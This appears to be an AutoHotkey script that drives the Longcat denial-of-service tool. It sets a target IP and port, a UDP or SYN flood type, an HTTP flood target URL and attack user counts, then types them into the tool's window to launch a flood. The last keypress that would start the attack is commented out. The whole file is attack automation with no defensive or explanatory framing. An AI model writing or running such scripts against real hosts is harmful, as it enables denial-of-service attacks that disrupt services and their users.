#CommentFlag //

// ------------------------------------------------
// CONFIG
// ------------------------------------------------

longcat_path = C:\DoStools\Longcat\binary\UF.exe

udpsyn_target_ip = 192.168.0.100
udpsyn_target_port = 443
udpsyn_attack_type = UDP Flood
// "SYN Flood","UDP Flood"
udpsyn_attack_users = 3

http_target_url = www.example.edu
http_attack_users = 15

attack_variant = udpsyn
// "udpsyn","http"

// ------------------------------------------------
// MAIN SCRIPT
// ------------------------------------------------

// Execute Longcat
Run, %longcat_path%

// Give focus to GoodBye window
WinActivate, Longcat
WinWaitActive, Longcat

// TCP/UDP target IP
SendInput, %udpsyn_target_ip%

// TCP/UDP target port
Send {TAB}	
SendInput, %udpsyn_target_port%

// TCP/UDP attack type
Send {TAB}
Send {TAB}
SendInput, %udpsyn_attack_type%

// HTTP Target URL
Send {TAB}
SendInput, %http_target_url%

// HTTP attack users
Send {TAB}
Send {TAB}
Send {TAB}
SendInput, %http_attack_users%

// TCP/UDP attack users
Send {TAB}
SendInput, %udpsyn_attack_users%

// Execute attack
if (attack_variant = "udpsyn") {
	Send {TAB}
	Send {TAB}
	Send {TAB}
}
if (attack_variant = "http") {
	Send {TAB}
	Send {TAB}
	Send {TAB}
	Send {TAB}
	Send {TAB}
	Send {TAB}
}
//Send {Enter}